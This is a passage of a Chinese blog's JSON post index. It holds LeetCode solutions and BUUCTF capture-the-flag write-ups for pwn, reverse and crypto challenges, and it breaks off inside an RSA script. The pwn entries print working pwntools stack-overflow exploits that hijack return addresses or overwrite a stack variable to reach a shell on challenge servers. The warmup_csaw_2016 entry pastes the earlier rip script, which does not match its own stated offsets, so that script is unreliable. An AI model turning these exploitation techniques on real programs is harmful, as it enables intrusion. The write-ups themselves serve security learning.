[&#x27;&#x27;] * numRows        cur_row = 0       # 当前行        going_down = False  # 是否向下移动        # 逐个字符放入对应的行        for c in s:            rows[cur_row] += c            # 到达第一行或最后一行时，改变方向            if cur_row == 0 or cur_row == numRows - 1:                going_down = not going_down            # 根据方向移动行索引            cur_row += 1 if going_down else -1        # 拼接所有行并返回        return &#x27;&#x27;.join(rows)\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-整数反转","url":"/posts/e078/","content":"给你一个 32 位的有符号整数 x ，返回将 x 中的数字部分反转后的结果。\n如果反转后整数超过 32 位的有符号整数的范围 [−231, 231 − 1] ，就返回 0。\n假设环境不允许存储 64 位整数（有符号或无符号）。\n示例 1：\n输入：x = 123输出：321\n示例 2：\n输入：x = -123输出：-321\n示例 3：\n输入：x = 120输出：21\n示例 4：\n输入：x = 0输出：0\n提示：\n\n-231 &lt;= x &lt;= 231 - 1\n\n有人跟我说，你直接用[::-1]不就好了？但是我们想想，如果x = -123,[::-1]的结果是什么？是不是321-?，那么如果是1230，是不是变成了0123？\n所以…\nclass Solution:    def reverse(self, x: int) -&gt; int:        # 处理符号，记录是否为负数        sign = -1 if x &lt; 0 else 1                # 转为正数处理        x = abs(x)                # 反转数字        result = 0        while x != 0:            # 取出最后一位数字            digit = x % 10            # 去掉最后一位数字            x //= 10            # 构建反转后的数字            result = result * 10 + digit                # 应用符号        result *= sign                # 检查是否超出32位整数范围        INT_MAX = 2**31 - 1        INT_MIN = -2**31                if result &gt; INT_MAX or result &lt; INT_MIN:            return 0                return result\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-字符串转换整数 (atoi)","url":"/posts/11b9/","content":"请你来实现一个 myAtoi(string s) 函数，使其能将字符串转换成一个 32 位有符号整数。\n函数 myAtoi(string s) 的算法如下：\n\n空格： 读入字符串并丢弃无用的前导空格（&quot; &quot;）\n符号： 检查下一个字符（假设还未到字符末尾）为 &#39;-&#39; 还是 &#39;+&#39;。如果两者都不存在，则假定结果为正。\n转换： 通过跳过前置零来读取该整数，直到遇到非数字字符或到达字符串的结尾。如果没有读取数字，则结果为0。\n舍入： 如果整数数超过 32 位有符号整数范围 [−231, 231 − 1] ，需要截断这个整数，使其保持在这个范围内。具体来说，小于 −231 的整数应该被舍入为 −231 ，大于 231 − 1 的整数应该被舍入为 231 − 1 。\n\n返回整数作为最终结果。\n示例 1：\n输入： s = “42”\n输出： 42\n解释：加粗的字符串为已经读入的字符，插入符号是当前读取的字符。\n带下划线线的字符是所读的内容，插入符号是当前读入位置。第 1 步：&quot;42&quot;（当前没有读入字符，因为没有前导空格）         ^第 2 步：&quot;42&quot;（当前没有读入字符，因为这里不存在 &#x27;-&#x27; 或者 &#x27;+&#x27;）         ^第 3 步：&quot;42&quot;（读入 &quot;42&quot;）           ^\n示例 2：\n输入： s = “ -042”\n输出：-42\n解释：\n第 1 步：&quot;   -042&quot;（读入前导空格，但忽视掉）            ^第 2 步：&quot;   -042&quot;（读入 &#x27;-&#x27; 字符，所以结果应该是负数）             ^第 3 步：&quot;   -042&quot;（读入 &quot;042&quot;，在结果中忽略前导零）               ^\n示例 3：\n输入： s = “1337c0d3”\n输出： 1337\n解释：\n第 1 步：&quot;1337c0d3&quot;（当前没有读入字符，因为没有前导空格）         ^第 2 步：&quot;1337c0d3&quot;（当前没有读入字符，因为这里不存在 &#x27;-&#x27; 或者 &#x27;+&#x27;）         ^第 3 步：&quot;1337c0d3&quot;（读入 &quot;1337&quot;；由于下一个字符不是一个数字，所以读入停止）             ^\n示例 4：\n输入： s = “0-1”\n输出： 0\n解释：\n第 1 步：&quot;0-1&quot; (当前没有读入字符，因为没有前导空格)         ^第 2 步：&quot;0-1&quot; (当前没有读入字符，因为这里不存在 &#x27;-&#x27; 或者 &#x27;+&#x27;)         ^第 3 步：&quot;0-1&quot; (读入 &quot;0&quot;；由于下一个字符不是一个数字，所以读入停止)          ^\n示例 5：\n输入： s = “words and 987”\n输出： 0\n解释：\n读取在第一个非数字字符“w”处停止。\n提示：\n\n0 &lt;= s.length &lt;= 200\ns 由英文字母（大写和小写）、数字（0-9）、&#39; &#39;、&#39;+&#39;、&#39;-&#39; 和 &#39;.&#39; 组成\n\nclass Solution:    def myAtoi(self, s: str) -&gt; int:        # 去除前导空格        i = 0        while i &lt; len(s) and s[i] == &#x27; &#x27;:            i += 1                # 如果字符串全是空格，返回0        if i == len(s):            return 0                # 检查符号        sign = 1        if s[i] == &#x27;+&#x27;:            sign = 1            i += 1        elif s[i] == &#x27;-&#x27;:            sign = -1            i += 1                # 读取数字部分        result = 0        while i &lt; len(s) and s[i].isdigit():            digit = int(s[i])                        # 检查是否会溢出            # 在添加新数字前先检查是否会溢出            if result &gt; (2**31 - 1 - digit) // 10:                # 溢出处理                if sign == 1:                    return 2**31 - 1  # 2147483647                else:                    return -2**31     # -2147483648                        result = result * 10 + digit            i += 1                # 应用符号        result *= sign                # 检查是否在32位有符号整数范围内        INT_MAX = 2**31 - 1        INT_MIN = -2**31                if result &gt; INT_MAX:            return INT_MAX        if result &lt; INT_MIN:            return INT_MIN                return result\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-回文数","url":"/posts/dbbd/","content":"给你一个整数 x ，如果 x 是一个回文整数，返回 true ；否则，返回 false 。\n回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。\n\n例如，121 是回文，而 123 不是。\n\n示例 1：\n输入：x = 121输出：true\n示例 2：\n输入：x = -121输出：false解释：从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。\n示例 3：\n输入：x = 10输出：false解释：从右向左读, 为 01 。因此它不是一个回文数。\n提示：\n\n-231 &lt;= x &lt;= 231 - 1\n\n进阶：你能不将整数转为字符串来解决这个问题吗？\nclass Solution:    def isPalindrome(self, x: int) -&gt; bool:        # 负数不是回文数        if x &lt; 0:            return False                # 单个数字是回文数        if x &lt; 10:            return True                # 计算x的反转数        original = x        reversed_num = 0                while x &gt; 0:            digit = x % 10            reversed_num = reversed_num * 10 + digit            x //= 10                # 比较原始数字和反转后的数字        return original == reversed_num\n\nclass Solution:    def isPalindrome(self, x: int) -&gt; bool:        # 负数一定不是回文数（因为会出现 &#x27;-&#x27;）        if x &lt; 0:            return False        # 转字符串反转比较        return str(x) == str(x)[::-1]\n\nclass Solution:    def isPalindrome(self, x: int) -&gt; bool:        if x &lt; 0 or (x % 10 == 0 and x != 0):            return False        reversed_half = 0        while x &gt; reversed_half:            reversed_half = reversed_half * 10 + x % 10            x //= 10        # 当长度为奇数时，reversed_half // 10 去掉中间数字        return x == reversed_half or x == reversed_half // 10\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-正则表达式匹配","url":"/posts/4382/","content":"给你一个字符串 s 和一个字符规律 p，请你来实现一个支持 &#39;.&#39; 和 &#39;*&#39; 的正则表达式匹配。\n\n&#39;.&#39; 匹配任意单个字符\n&#39;*&#39; 匹配零个或多个前面的那一个元素\n\n所谓匹配，是要涵盖 整个 字符串 s 的，而不是部分字符串。\n示例 1：\n输入：s = &quot;aa&quot;, p = &quot;a&quot;输出：false解释：&quot;a&quot; 无法匹配 &quot;aa&quot; 整个字符串。\n示例 2:\n输入：s = &quot;aa&quot;, p = &quot;a*&quot;输出：true解释：因为 &#x27;*&#x27; 代表可以匹配零个或多个前面的那一个元素, 在这里前面的元素就是 &#x27;a&#x27;。因此，字符串 &quot;aa&quot; 可被视为 &#x27;a&#x27; 重复了一次。\n示例 3：\n输入：s = &quot;ab&quot;, p = &quot;.*&quot;输出：true解释：&quot;.*&quot; 表示可匹配零个或多个（&#x27;*&#x27;）任意字符（&#x27;.&#x27;）。\n提示：\n\n1 &lt;= s.length &lt;= 20\n1 &lt;= p.length &lt;= 20\ns 只包含从 a-z 的小写字母。\np 只包含从 a-z 的小写字母，以及字符 . 和 *。\n保证每次出现字符 * 时，前面都匹配到有效的字符\n\nclass Solution:    def isMatch(self, s: str, p: str) -&gt; bool:        m, n = len(s), len(p)        dp = [[False] * (n + 1) for _ in range(m + 1)]        dp[0][0] = True        # 初始化：空字符串匹配 p 的前缀        for j in range(2, n + 1):            if p[j - 1] == &#x27;*&#x27;:                dp[0][j] = dp[0][j - 2]        # 状态转移        for i in range(1, m + 1):            for j in range(1, n + 1):                if p[j - 1] == &#x27;.&#x27; or p[j - 1] == s[i - 1]:                    dp[i][j] = dp[i - 1][j - 1]                elif p[j - 1] == &#x27;*&#x27;:                    dp[i][j] = dp[i][j - 2]  # 匹配0次                    if p[j - 2] == s[i - 1] or p[j - 2] == &#x27;.&#x27;:                        dp[i][j] |= dp[i - 1][j]        return dp[m][n]\n\nclass Solution:    def isMatch(self, s: str, p: str) -&gt; bool:        m, n = len(s), len(p)        # dp[i][j] 表示 s[0:i] 与 p[0:j] 是否匹配        dp = [[False] * (n + 1) for _ in range(m + 1)]                # 空字符串与空模式匹配        dp[0][0] = True                # 处理 s 为空字符串的情况        # 只有当 p 中的字符都是 &quot;x*&quot; 形式时才能匹配空字符串        for j in range(2, n + 1):            if p[j - 1] == &#x27;*&#x27;:                dp[0][j] = dp[0][j - 2]                # 填充 dp 表        for i in range(1, m + 1):            for j in range(1, n + 1):                if p[j - 1] == &#x27;*&#x27;:                    # p[j-1] 是 &#x27;*&#x27;                    # 情况1: &#x27;*&#x27; 匹配0个前面的字符，即 dp[i][j-2]                    # 情况2: &#x27;*&#x27; 匹配1个或多个前面的字符，需要 s[i-1] 与 p[j-2] 匹配，然后看 dp[i-1][j]                    dp[i][j] = dp[i][j - 2]  # 匹配0个                    if p[j - 2] == &#x27;.&#x27; or p[j - 2] == s[i - 1]:                        dp[i][j] = dp[i][j] or dp[i - 1][j]  # 匹配1个或多个                else:                    # p[j-1] 不是 &#x27;*&#x27;                    # 当前字符匹配且前面部分也匹配                    if p[j - 1] == &#x27;.&#x27; or p[j - 1] == s[i - 1]:                        dp[i][j] = dp[i - 1][j - 1]                return dp[m][n]\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【BUUCTF】PWN-刷题记录-test_your_nc","url":"/posts/579e/","content":"题目信息\n解题步骤\nnc 连接后，可以直接执行命令，在此我们执行ls后看到了flag文件\ncat flag 即可获得flag\n\n","categories":["网络安全","CTF","BUUCTF","PWN"],"tags":["BUUCTF","PWN"]},{"title":"【BUUCTF】PWN-刷题记录-rip","url":"/posts/3ada/","content":"题目信息\n解题步骤\n程序是amd64、小端程序，GOT表在运行时仍然可写，存在GOT覆盖风险，没有栈保护,栈可执行、程序基地址固定\n使用ida进行分析：\n\n上述代码中，我们注意：\nchar s[15]; // [rsp+1h] [rbp-Fh]gets(s, argv);\n\ns 数组大小为 15 字节，位于栈上。\n使用了 危险函数 gets()：它会无限读取输入直到换行，完全不检查缓冲区边界。\n\ngets(s) 会把你输入的所有字节写到栈上：先写入 s（15字节），接着覆盖 saved rbp（8字节），再覆盖 return address（8字节），后面跟着你继续写的字节都会保存在 return address 之后的栈上（函数返回时 ret 从栈上弹出的就是我们写入的返回地址）。\n\ns 距离 rbp 仅 0xF = 15 字节，而 rbp 上方 8 字节是 返回地址（return address）。\n因此，输入超过 15 + 8 = 23 字节 即可覆盖返回地址。\n\n\n程序还有一个fun函数，调用了system函数，地址为0x401186\n程序的system函数，地址为0x404058\n\n这道题基本是典型的ret2fun，我们可以覆盖返回地址，让程序执行 fun() 函数（地址 0x401186）\n\n输入 23 字节填充（覆盖到返回地址）\n写入 fun 函数地址（小端序）：p64(0x401186)\n发送 payload，触发溢出，ret 跳转到 fun，执行 /bin/sh\n\nfrom pwn import *# context.log_level = &#x27;debug&#x27;p = process(&#x27;./rip&#x27;)elf = ELF(&#x27;./rip&#x27;)# fun 函数地址fun_addr = 0x401186 +1# 构造 payloadpayload = b&#x27;A&#x27; * 23          # 填充到返回地址payload += p64(fun_addr)     # 覆盖返回地址为 fun 函数地址# 发送输入p.sendline(payload)# 切换到交互模式p.interactive()\n\n那么大家发现了一个问题吗？为什么我在fun地址后+1了？fun_addr = 0x401186 +1\n; Attributes: bp-based frame; int fun()public funfun proc near; __unwind &#123;push    rbpmov     rbp, rsplea     rdi, command    ; &quot;/bin/sh&quot;call    _systemnoppop     rbpretn; &#125; // starts at 401186fun endp\n0x401186: push rbp0x401187: mov  rbp, rsp0x40118a: lea  rdi, [command]   ; &quot;/bin/sh&quot;0x401191: call _system0x401196: nop0x401197: pop  rbp0x401198: retn\n\n0x401186 的第一条指令是 push rbp（opcode 0x55）。fun + 1 即 0x401187 刚好是下一条指令 mov rbp, rsp 的起始字节（opcode 0x48）。\n如果把返回地址覆盖成 0x401186（push rbp），当 CPU 执行到这里时会先执行 push rbp，也就是把当前 rbp 再次压入栈，rsp 会减 8。这会改变栈指针（和栈对齐），可能导致之后 call _system 时栈不满足 ABI 对 call 前对齐 的要求，从而在某些环境下造成 crash（尤其当 system 或 libc 内部对栈对齐敏感时）。\n如果你把返回地址改成 0x401187（mov rbp, rsp），你跳过了 push rbp，不会额外改变 rsp，因此更有可能维持或更接近你在 exploit 时期望的栈对齐状态，从而 更稳定地成功调用 system(&quot;/bin/sh&quot;)。\n\n有两点常被误解：\n\n“地址必须 16 字节对齐” —— 这是对函数调用的 ABI 要求（call 之前），但 CPU 本身并不强制指令地址按 16 字节对齐；x86 指令是可变长且可以从任何有效指令边界开始执行。\n\n“跳到奇数地址会异常” —— 只要你落在一个有效的指令起始字节（而不是指令中间导致非法解码），即可正常执行。0x401187 在这里是 mov rbp, rsp 的起始字节，是合法的入口点，所以可行。\n\n\nfun + 1 是一个常见且合理的技巧：它跳过 push rbp，避免多做一次 rsp -= 8，从而更容易满足 call _system 执行前的栈对齐要求，结果更稳定。\n\n在Ubuntu 18.04及以上版本中，即使关闭栈对齐，调用  system(“/bin/sh”)  时仍需确保栈地址16字节对齐，否则会触发段错误。此时需在payload中手动调整栈对齐（如跳过  push %rbp  指令）\n\n\n\nfrom pwn import *# context.log_level = &#x27;debug&#x27;# p = process(&#x27;./rip&#x27;)p = remote(&quot;node5.buuoj.cn&quot;, 29689)elf = ELF(&#x27;./rip&#x27;)# fun 函数地址fun_addr = 0x401186 +1# 构造 payloadpayload = b&#x27;A&#x27; * 23          # 填充到返回地址payload += p64(fun_addr)     # 覆盖返回地址为 fun 函数地址# 发送输入p.sendline(payload)# 切换到交互模式p.interactive()\n\n\n","categories":["网络安全","CTF","BUUCTF","PWN"],"tags":["BUUCTF","PWN"]},{"title":"【BUUCTF】PWN-刷题记录-warmup_csaw_2016","url":"/posts/c47f/","content":"题目信息\n解题步骤\n和上一题基本一样\n\nint __fastcall main(int a1, char **a2, char **a3)&#123;  char s[64]; // [rsp+0h] [rbp-80h] BYREF  _BYTE v5[64]; // [rsp+40h] [rbp-40h] BYREF  write(1, &quot;-Warm Up-\\n&quot;, 0xAu);  write(1, &quot;WOW:&quot;, 4u);  sprintf(s, &quot;%p\\n&quot;, sub_40060D); // sub_40060D中，调用system cat了flag  write(1, s, 9u);  write(1, &quot;&gt;&quot;, 1u);  return gets(v5);&#125;\nint sub_40060D()&#123;  return system(&quot;cat flag.txt&quot;);&#125;\n\nv5 是输入缓冲区：gets(v5)，大小 64 字节。\nv5 距离 rbp 是 0x40 = 64 字节。\n返回地址在 rbp + 8。\n所以从 v5 到返回地址的距离是：0x40 + 8 = 72 字节。\n\n\nsprintf(s, &quot;%p\\n&quot;, sub_40060D); write(1, s, 9);\n这行代码会打印 sub_40060D 函数的地址！\n例如输出：WOW:0x40060d\n\n\n这意味着：我们知道了 sub_40060D 的地址，也就是 system(&quot;cat flag.txt&quot;) 的地址！\n\n由于程序没有开启 PIE（地址固定），且我们直接拿到了 sub_40060D 的地址，所以,我们可以直接跳转到 sub_40060D，执行 system(&quot;cat flag.txt&quot;)，直接读取 flag！\n我们只需要：\n\n接收程序输出，提取 sub_40060D 的地址。\n构造 payload：\n72 字节填充（覆盖到返回地址）\n覆盖返回地址为 sub_40060D 的地址\n\n\n发送 payload\n获取 flag\n\nfrom pwn import *# context.log_level = &#x27;debug&#x27;# p = process(&#x27;./rip&#x27;)p = remote(&quot;node5.buuoj.cn&quot;, 29689)elf = ELF(&#x27;./rip&#x27;)# fun 函数地址fun_addr = 0x401186 +1# 构造 payloadpayload = b&#x27;A&#x27; * 23          # 填充到返回地址payload += p64(fun_addr)     # 覆盖返回地址为 fun 函数地址# 发送输入p.sendline(payload)# 切换到交互模式p.interactive()\n\n","categories":["网络安全","CTF","BUUCTF","PWN"],"tags":["BUUCTF","PWN"]},{"title":"【BUUCTF】PWN-刷题记录-ciscn_2019_n_1","url":"/posts/2b33/","content":"题目信息\n解题步骤\n[*] &#x27;/home/kali/Desktop/buuctf/ciscn_2019_n_1&#x27;    Arch:       amd64-64-little      → 64位小端程序    RELRO:      Partial RELRO        → GOT表可写（可被劫持）    Stack:      No canary found      → 无栈保护，可溢出    NX:         NX enabled           → 栈不可执行（不能直接执行shellcode）    PIE:        No PIE (0x400000)    → 地址固定，无ASLR    Stripped:   No                   → 符号表未剥离，函数名可见\n用 IDA 打开二进制文件，main 函数非常简单：\n\n关键逻辑在 func()：\n\n\nv1[44]：输入缓冲区，位于 [rbp-0x30]\nv2：float 类型，位于 [rbp-0x4]，初始值 0.0\n使用 gets(v1) → 栈溢出漏洞\n条件：v2 == 11.28125 才能执行\nsystem(&quot;cat /flag&quot;)\n\n直觉告诉我：不能直接 ROP 到 system，因为 v2 必须等于 11.28125。\n但 v2 就在栈上，紧挨着 v1！\n栈布局:\n+------------------+| saved rbp        | &lt;- rbp+------------------+| return address   | &lt;- rbp + 8+------------------+| ...              |+------------------+| v2 (4 bytes)     | &lt;- [rbp-0x4]+------------------+| padding?         | &lt;- [rbp-0x5 ~ 0x2b] (可能填充)+------------------+| v1[44]           | &lt;- [rbp-0x30] ~ [rbp-0x1]+------------------+\n也就是说，v1 和 v2 之间有 0x30 - 0x4 = 0x2c = 44 字节，但 v1 是 44 字节，v2 在 [rbp-4]，所以：v1 的最后 4 字节可以直接覆盖 v2 的内存！\n浮点数陷阱：11.28125 的二进制表示\nv2 是 float，我们需要知道 11.28125 在内存中长什么样。\n用 Python 计算：\nimport struct# 将 float 转为 4 字节 IEEE 754f = 11.28125packed = struct.pack(&#x27;f&#x27;, f)  # 小端print(packed.hex())  # 输出：00803441\n\n所以 11.28125 的内存表示是：\\x00\\x80\\x34\\x41（小端）\n我们只需要在 v1 的最后 4 字节写入 \\x00\\x80\\x34\\x41，就能让 v2 == 11.28125\n从 v1[0] 到 return address 的距离：\n\nv1：44 字节（[rbp-0x30] ~ [rbp-0x1]）\nv2：4 字节（[rbp-0x4]）\nsaved rbp：8 字节（[rbp+0]）\n返回地址：[rbp+8]\n\n所以：\n\n从 v1[0] 到 saved rbp：44 + 4 = 48 字节\n到返回地址：48 + 8 = 56 字节\n\n填充 56 字节后，接下来 8 字节就是返回地址。\n目标：覆盖 v2 为 11.28125，并跳转到 system(&quot;cat /flag&quot;)\n但 system(&quot;cat /flag&quot;) 已经在程序里了！我们只需要让函数正常返回，条件满足就会自动执行。\n所以 payload 只需要：\n\n前 44 字节：任意填充\n接下来 4 字节：覆盖 v2 为 11.28125 的二进制\n8 字节：覆盖 saved rbp（可任意）\n8 字节：覆盖返回地址为 func 函数末尾，让 if 条件成立后继续执行\n\n但更简单的方式是：让函数返回后，直接跳回 func 中 if 之后的代码。\n然而，最直接的方式是：不改变控制流，只让 v2 被覆盖，然后函数自然执行 system\n但 gets 后函数就结束了，我们无法控制 return 到哪。\n等等——我们不需要 ROP！\n只要 v2 被覆盖为 11.28125，gets 返回后，if 条件成立，直接执行 system(&quot;cat /flag&quot;)！\n所以：\n\n 我们甚至不需要控制返回地址！只需要在 v1 的最后 4 字节写入 11.28125 的二进制即可！\n\n但 gets 会读取到 \\x00 吗？\n会！gets 读取直到 \\n，不会在 \\x00 停止。\nfrom pwn import *p = process(&#x27;./ciscn_2019_n_1&#x27;)# p = remote(&#x27;node5.buuoj.cn&#x27;, 25195)# 计算 11.28125 的 float 表示v2_value = struct.pack(&#x27;f&#x27;, 11.28125)  # b&#x27;\\x00\\x804A&#x27;# 构造 payloadpayload = b&#x27;A&#x27; * 44        # 填充 v1payload += v2_value        # 覆盖 v2p.sendline(payload)# 或者直接交互p.interactive()  # 应该能收到 flag\n\nfrom pwn import *# p = process(&#x27;./ciscn_2019_n_1&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;, 25195)# 计算 11.28125 的 float 表示v2_value = struct.pack(&#x27;f&#x27;, 11.28125)  # b&#x27;\\x00\\x804A&#x27;# 构造 payloadpayload = b&#x27;A&#x27; * 44        # 填充 v1payload += v2_value        # 覆盖 v2p.sendline(payload)# 或者直接交互p.interactive()  # 应该能收到 flag\n\n","categories":["网络安全","CTF","BUUCTF","PWN"],"tags":["BUUCTF","PWN"]},{"title":"【BUUCTF】REVERSE-刷题记录-easyre","url":"/posts/6623/","content":"题目信息\n解题步骤先用DIE分析，发现是64位C程序\n\n使用IDA分析：\n\n也就是输入两个相同字符，就可以拿到flag\nflag&#123;this_Is_a_EaSyRe&#125;\n","categories":["网络安全","CTF","BUUCTF","REVERSE"],"tags":["BUUCTF","REVERSE"]},{"title":"【BUUCTF】REVERSE-刷题记录-reverse1","url":"/posts/e746/","content":"题目信息\n解题步骤\n编译器为 MSVC 19.00，对应 Visual Studio 2015 或 2017 版本。\n使用ida查看：\n\nfor ( j = 0; ; ++j )&#123;  v10 = j;  if ( j &gt; j_strlen(Str2) )    break;  if ( Str2[j] == 111 )    Str2[j] = 48;&#125;\n\nStr2 是一个字符串（全局变量或常量）\n遍历 Str2，把所有字符 &#39;o&#39;（ASCII 111）替换成 &#39;0&#39;（ASCII 48）\n条件是 j &gt; j_strlen(Str2) 才跳出 → 实际是 j &lt;= len 时继续\n所以这是一个 字符串预处理：将 Str2 中的 o → 0\n\n\n Str2 是“正确 flag”的模板，但被混淆了（用 o 代替 0）\n\nsub_1400111D1(&quot;input the flag:&quot;);sub_14001128F(&quot;%20s&quot;, Str1);\n\nsub_1400111D1：puts 或 printf 的封装（输出）\nsub_14001128F：scanf 的封装（输入）\n%20s：读取最多 20 个字符到 Str1\n所以用户输入被限制为 最多 20 字符的字符串\n\nv5 = j_strlen(Str2);if ( !strncmp(Str1, Str2, v5) )  sub_1400111D1(&quot;this is the right flag!\\n&quot;);else  sub_1400111D1(&quot;wrong flag\\n&quot;);\n\nj_strlen(Str2)：获取 Str2 的长度\nstrncmp(Str1, Str2, v5)：比较用户输入 Str1 和处理后的 Str2\n如果相等 → 输出 “right flag”\n\n所以我们要查看str2\n\n根据代码\nfor ( j = 0; ; ++j )&#123;    v10 = j;    if ( j &gt; j_strlen(Str2) )        break;    if ( Str2[j] == 111 )      // 111 是字符 &#x27;o&#x27; 的 ASCII 码        Str2[j] = 48;          // 48 是字符 &#x27;0&#x27; 的 ASCII 码&#125;\n进行变换，得到{hell0_w0rld}\n当然，也可以打个断点进行调试，直接看内容：\n\n\n","categories":["网络安全","CTF","BUUCTF","REVERSE"],"tags":["BUUCTF","REVERSE"]},{"title":"【BUUCTF】REVERSE-刷题记录-reverse2","url":"/posts/e606/","content":"题目信息\n解题步骤使用DIE分析：\n\n使用IDA分析\n\nv8 = __readfsqword(0x28u);  // Canary，防栈溢出pid = fork();               // 关键！创建子进程\nfork() 的行为回顾\nfork() 创建一个子进程，复制父进程的内存空间\n子进程返回 0\n父进程返回子进程 PID\n之后两个进程独立运行\n\n所以：\nif (pid) &#123; /* 父进程 */ &#125; else     &#123; /* 子进程 */ &#125;\nflag 字符串到底被谁修改了？看这段代码：\nelse&#123;  for ( i = 0; i &lt;= strlen(flag); ++i )  &#123;    if ( flag[i] == 105 || flag[i] == 114 )      flag[i] = 49;  &#125;&#125;\n\n105 → &#39;i&#39;\n114 → &#39;r&#39;\n49 → &#39;1&#39;\n\n所以：子进程把 flag 中的 &#39;i&#39; 和 &#39;r&#39; 都替换成了 &#39;1&#39;\n我立刻打开 IDA，查找 flag 的定义。\n在 .data 段发现：\nflag 是一个位于 .data 段的全局字符串：\n\n代码理解：\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  int stat_loc;  int i;  __pid_t pid;  char s2[24];  unsigned __int64 v8;  v8 = __readfsqword(0x28u);  // Stack Canary  pid = fork();               // 创建子进程  if ( pid )  &#123;    waitpid(pid, &amp;stat_loc, 0);  // 父进程等待子进程结束  &#125;  else  &#123;    // 子进程执行    for ( i = 0; i &lt;= strlen(flag); ++i )    &#123;      if ( flag[i] == 105 || flag[i] == 114 )  // &#x27;i&#x27; 或 &#x27;r&#x27;        flag[i] = 49;                          // 替换为 &#x27;1&#x27;    &#125;  &#125;  printf(&quot;input the flag:&quot;);  __isoc99_scanf(&quot;%20s&quot;, s2);  if ( !strcmp(flag, s2) )    return puts(&quot;this is the right flag!&quot;);  else    return puts(&quot;wrong flag!&quot;);&#125;\n所以最终的flag是：{hack1ng_fo1_fun}\nflag{hack1ng_fo1_fun}\n","categories":["网络安全","CTF","BUUCTF","REVERSE"],"tags":["BUUCTF","REVERSE"]},{"title":"【BUUCTF】CRYPTO-刷题记录-Alice与Bob","url":"/posts/21f/","content":"题目信息\n解题步骤\n密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数:98554799767,请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。 注意：得到的 flag 请包上 flag{} 提交\n\n寻找那对“命中注定”的素数给定的数字是：\n98554799767\n它看起来很大，但在现代计算面前，不过是小菜一碟。\n如果这是 RSA 的模数 $n = p \\times q$，那么 $p$ 和 $q$ 都是素数，且通常接近 $\\sqrt{N}$。\n于是我打开 Python，轻声说道：import mathN = 98554799767sqrt_N = int(math.isqrt(N))print(f&quot;√N ≈ &#123;sqrt_N&#125;&quot;)\n\n所以，我只需要从 313934 附近开始，向下寻找能整除 N 的素数。p = sqrt_Nwhile p &gt; 1:    if N % p == 0:        q = N // p        print(f&quot;Found! p = &#123;p&#125;, q = &#123;q&#125;&quot;)        break    p -= 1\n\n我屏住呼吸——两个都是素数吗？\n快速验证：def is_prime(n):    if n &lt; 2:        return False    for i in range(2, int(math.isqrt(n)) + 1):        if n % i == 0:            return False    return Trueprint(is_prime(101999))  # Trueprint(is_prime(966233))  # True\n成功！Alice 是 101999，Bob 是 966233，他们在 98554799767 中重逢。\n合成新数字题目说：“小的放前面，大的放后面”。\n所以：$新数字 = 101999966233$\n生成 MD5 哈希现在，我对这个“相遇之数”进行 MD5 哈希：import hashlibcombined = &quot;101999966233&quot;md5 = hashlib.md5(combined.encode()).hexdigest()print(md5)得到：d450209323a847c8d01c6be47c81811a\n献给 Alice 和 Bob 的情书将哈希值包上 flag{}，就是这道题的最终答案：flag{d450209323a847c8d01c6be47c81811a}\n素数的爱情哲学在这个世界里，大多数数字都可以被分解、被预测、被破解。但素数不同，它们孤傲、不可分割，像极了爱情最初的模样。\n而当两个素数相遇，它们的乘积就成了密码学的基石——既公开于世，又守护着彼此的秘密。\n就像 Alice 和 Bob，即使没有身份认证，也能知根知底；即使历经置换与轮加密，也无法混淆真心。\n这道题，不只是数学，更是一封写给密码学的情书。\n\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-RSA1","url":"/posts/345f/","content":"题目信息\n解题步骤\n题目给出了如下信息：\np = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852\nDP泄露我们可以先使用tools.qsnctf.com工具，先计算一下n\n\n随后根据N，e，c，dp，利用dp泄露攻击\n\nflag{W31c0m3_70_Ch1n470wn}\n\n中国剩余定理\n# 给定参数p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852# 步骤1：计算 mp = c^dp mod pmp = pow(c, dp, p)# 步骤2：计算 mq = c^dq mod qmq = pow(c, dq, q)# 步骤3：计算 q 在模 p 下的逆元q_inv = pow(q, -1, p)# 步骤4：CRT 合并h = (q_inv * (mp - mq)) % pm = mq + h * q# 输出明文 mprint(&quot;明文 m =&quot;, m)# 将 m 转为 bytesflag = m.to_bytes((m.bit_length() + 7) // 